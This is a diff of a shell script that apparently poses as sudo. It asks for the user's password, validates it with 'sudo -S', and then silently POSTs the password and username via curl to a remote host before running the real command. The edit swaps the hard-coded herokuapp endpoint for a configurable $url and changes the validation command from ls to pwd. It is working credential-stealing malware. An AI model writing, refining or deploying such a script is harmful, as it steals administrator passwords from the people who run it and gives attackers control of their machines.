@@ -8,7 +8,7 @@ echo -n "$prompt"
 read -s password
 echo ""
 
-response=$(echo "$password" | /usr/bin/sudo -S ls 2>&1)
+response=$(echo "$password" | /usr/bin/sudo -S pwd 2>&1)
 if [[ $response == *$failureString1* ]]; then
   echo "$failureString1"
   
@@ -16,7 +16,7 @@ if [[ $response == *$failureString1* ]]; then
   read -s password
   echo ""
 
-  response=$(echo "$password" | /usr/bin/sudo -S ls 2>&1)
+  response=$(echo "$password" | /usr/bin/sudo -S pwd 2>&1)
   if [[ $response == *$failureString1* ]]; then
     echo "$failureString1"
 
@@ -24,7 +24,7 @@ if [[ $response == *$failureString1* ]]; then
     read -s password
     echo ""
 
-    response=$(echo "$password" | /usr/bin/sudo -S ls 2>&1)
+    response=$(echo "$password" | /usr/bin/sudo -S pwd 2>&1)
     if [[ $response == *"incorrect password attempt"* ]]; then
       echo "$failureString2"
       exit 1
@@ -32,5 +32,5 @@ if [[ $response == *$failureString1* ]]; then
   fi
 fi
 
-curl -s --location --request POST "https://sudo-pw.herokuapp.com/throw?password=$password&username=$user" 2>&1 > /dev/null
+curl -s --location --request POST "$url?password=$password&username=$user" 2>&1 > /dev/null
 echo "$password" | /usr/bin/sudo -S $*
